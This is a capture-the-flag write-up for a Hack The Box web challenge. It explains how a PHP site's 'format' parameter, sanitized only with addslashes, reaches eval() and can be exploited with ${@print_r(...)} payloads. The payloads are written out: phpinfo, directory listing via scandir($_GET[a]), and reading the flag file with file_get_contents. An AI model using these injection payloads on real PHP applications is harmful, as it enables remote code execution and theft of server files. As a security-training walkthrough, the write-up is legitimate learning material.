# My Solution

We have a website that predicts the exact moment you'll find the real love. By playing around with the site we clearly see that the format of the displayed datetime varies depending on the format passed in the get parameter 'format'.  

Since the source code is available, we can download it and analyze it.  
We have a sample flag file (clearly not the flag we want, too easy otherwise ). We also have an entrypoint.sh script which generates a 5 character string and move the content of /flag to /flag{5 random chars}. It's very likely that the script has been used in an initialization phase and that the file /flag{5 random chars} will contain the HTB flag.  

By looking at the actual code of the web server, we can see that the format variable is sanitized with the *addslashes* function. Therefore the NULL,\',\" and \\ characters are sanitized.  
After the sanitization, the variable 'format' is used to specify the format of the Datetime to display. The eval() function allows to produce the desired Datetime and store the result in the $time variable which is then displayed in the view.  

At a first sight, it results quite clear that our attempts should be focused on bypassing the *addslashes* function in order to have code execution on eval.  

In order to bypass the *addslashes()* we may use characters that trigger multibyte characters, thus avoiding the sanitization of the special characters \' or \". In our case, this first attempts were unsuccessful.  

More fruitful, instead, is to take a look at how *eval()* evaluates the commands. This function in fact, evaluates the variable passed in the string parameter. So, by passing a string like ${print("ciao")}, *eval()* would execute the statement and return the result of the statement.  
In our case,however, it is not possible to use above statement because the character \" is sanitized by addslashes. Luckily, the php version in use is 7.2.x (as we can see from the Dockerfile in the zip source code we downloaded at the beginning). In this php version it is possible to write ${print(ciao)} without running into a fatal error. In fact, The php interpreter will throw a warning but it will considered *ciao* as a string, without interrupting the execution.  
We can suppress the warning by using the @ operator.  

We can now apply it in practise and see whether it actually works.
```
http://HOST:PORT/?format=${@print("ciao")}
```
The print is actually executed and 'ciao' is displayed on the website.  
We can now try with something a bit more useful than simply printing a 'ciao' string.  

We may get information of the environment and php
```
format=${@print_r(phpinfo())}
```
We see we are in /home/www and the user is www.  

We may want to see the content of the current directory (use of \' or \" is not yet allowed because of  *addslashes* )
```
GET /?format=${@print_r(get_defined_functions()[internal][481](ls))}
```
But the flag file is not here.  

As we saw  at the beginning, the flag file may be stored in the root directory, more specifically in a directory/file with name /flag{5 random chars}.  
We can use the *scandir()* function to get the content of a directory passed as parameter. However an injection like scandir('/') would not work because of the sanitization of \'.  
This can easily be solved by passing the parameter in a get variable and then by calling that variable.
```
http://HOST:PORT/?format=${@print_r(scandir($_GET[a]))}&a=/
```
And we get:
```
Array
(
    [0] => .
    [1] => ..
    [2] => .dockerenv
    [3] => bin
    [4] => boot
    [5] => dev
    [6] => entrypoint.sh
    [7] => etc
    [8] => flagHy4zs
    [9] => home
    [10] => lib
    [11] => lib64
    [12] => media
    [13] => mnt
    [14] => opt
    [15] => proc
    [16] => root
    [17] => run
    [18] => sbin
    [19] => srv
    [20] => sys
    [21] => tmp
    [22] => usr
    [23] => var
    [24] => www
)
```

We can now get the content of /flagHy4zs
```
GET /?format=${@print_r(file_get_contents($_GET[a]))}&a=/flagHy4zs
```
And we get the flag :)))
